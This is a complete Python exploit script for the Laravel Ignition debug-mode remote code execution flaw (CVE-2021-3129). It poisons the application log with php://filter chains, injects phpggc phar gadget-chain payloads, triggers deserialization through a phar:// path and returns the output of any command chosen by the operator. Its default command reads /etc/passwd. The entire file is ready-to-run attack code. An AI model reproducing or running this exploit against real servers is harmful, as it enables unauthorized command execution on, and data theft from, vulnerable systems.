#!/usr/bin/python3

import requests as req
import os, uuid
import subprocess
import argparse


def set_gadget_chains(gadget_chains):
    if not gadget_chains:
        #  print("NO GADGET CHAINS SET")
        chains = [ 'monolog/rce1', 'monolog/rce1', 'monolog/rce3' ]
        if os.path.exists('gadget_chains.txt'):
            with open('gadget_chains.txt', 'r') as f:
                chains = f.read().splitlines()
        return chains

    return gadget_chains

class Exp:
    __delimiter_len = 8  # 定界符长度

    def __vul_check(self):
        resp = req.get(self.__url, verify=False)
        if resp.status_code != 405 and "laravel" not in resp.text:
            return False
        return True

    def __validate_gadget_chain(self, gadget_chain):
        proc = subprocess.Popen("./phpggc/phpggc -i %s | grep ERROR" % (gadget_chain), shell=True, stdout=subprocess.PIPE)
        has_error, cmd_err = proc.communicate()

        # print(has_error, err)

        return not has_error and cmd_err == None

    def __payload_send(self, payload):
        header = {
            "Accept": "application/json"
        }
        data = {
            "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
            "parameters": {
                "variableName": "cve20213129",
                "viewFile": ""
            }
        }
        data["parameters"]["viewFile"] = payload
        resp = req.post(self.__url, headers=header, json=data, verify=False)
        # print(resp.text)
        return resp

    def __command_handler(self, command):
        """
        因为用户命令要注入到payload生成的命令中，为了防止影响结构，所以进行一些处理。
        """

        self.__delimiter = str(uuid.uuid1())[:self.__delimiter_len]  # 定界符用于定位页面中命令执行结果的位置。
        # print(delimiter)
        command = "echo %s && %s && echo %s" % (self.__delimiter, command, self.__delimiter)
        # print(command)

        escaped_chars = [' ', '&', '|']  # 我只想到这么多，可自行添加。
        for c in escaped_chars:
            command = command.replace(c, '\\' + c)
        # print(command)
        return command

    def __clear_log(self):
        return self.__payload_send(
            "php://filter/write=convert.iconv.utf-8.utf-16le|convert.quoted-printable-encode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/src/storage/logs/laravel.log")

    def __gen_payload(self, gadget_chain):
        gen_shell = r""" php -d 'phar.readonly=0' phpggc/phpggc %s system %s --phar phar -o php://output | base64 -w0 | python -c "import sys;print(''.join(['=' + hex(ord(i))[2:].zfill(2) + '=00' for i in sys.stdin.read()]).upper())" > payload.txt""" % (gadget_chain, self.__command)
        # print(gen_shell)
        os.system(gen_shell)
        with open('payload.txt', 'r') as f:
            payload = f.read().replace('\n', '') + 'a'  # 添加一个字符使得两个完整的payload总是只有一个可以正常解码
        os.system("rm payload.txt")
        # print(payload)
        return payload

    def __decode_log(self):
        return self.__payload_send(
            "php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=/src/storage/logs/laravel.log")

    def __unserialize_log(self):
        return self.__payload_send("phar:///src/storage/logs/laravel.log/test.txt")

    def __rce(self):
        text = self.__unserialize_log().text
        # print(text)

        echo_find = text.find(self.__delimiter)
        # print(echo_find)
        if echo_find >= 0:
            return text[echo_find + self.__delimiter_len + 1: text.find(self.__delimiter, echo_find + 1)]
        else:
            return "[-] RCE echo is not found."

    def exp(self):
        for gadget_chain in self.__gadget_chains:
            print("[*] Try to use %s for exploitation." % (gadget_chain))
            if not self.__validate_gadget_chain(gadget_chain):
                print("[-] %s is not a valid phpggc gadget chain" % (gadget_chain))
                continue

            self.__clear_log()
            self.__clear_log()
            self.__payload_send('a' * 2)
            self.__payload_send(self.__gen_payload(gadget_chain))
            self.__decode_log()
            print("[*] Result:")
            print(self.__rce())

    def __init__(self, target, command, gadget_chains):
        self.target = target
        self.__url = req.compat.urljoin(target, "_ignition/execute-solution")
        self.__command = self.__command_handler(command)
        self.__gadget_chains = gadget_chains
        if not self.__vul_check():
            print("[-] [%s] is seems not vulnerable." % (self.target))
            print("[*] You can also call obj.exp() to force an attack.")
        else:
            self.exp()


def main():
    parser = argparse.ArgumentParser(description='Laravel debug RCE')
    parser.add_argument('--chains', nargs='+', help='phpggc gadget chain names')
    parser.add_argument('--host', default='http://127.0.0.1:8888', help='target host (default: http://127.0.0.1:8888)')
    parser.add_argument('command', nargs='?', default='cat /etc/passwd', help='command (default: "cat /etc/passwd")')

    args = parser.parse_args()
    args.chains = set_gadget_chains(args.chains)

    #  print(args)

    Exp(args.host, args.command, args.chains)


if __name__ == '__main__':
    main()
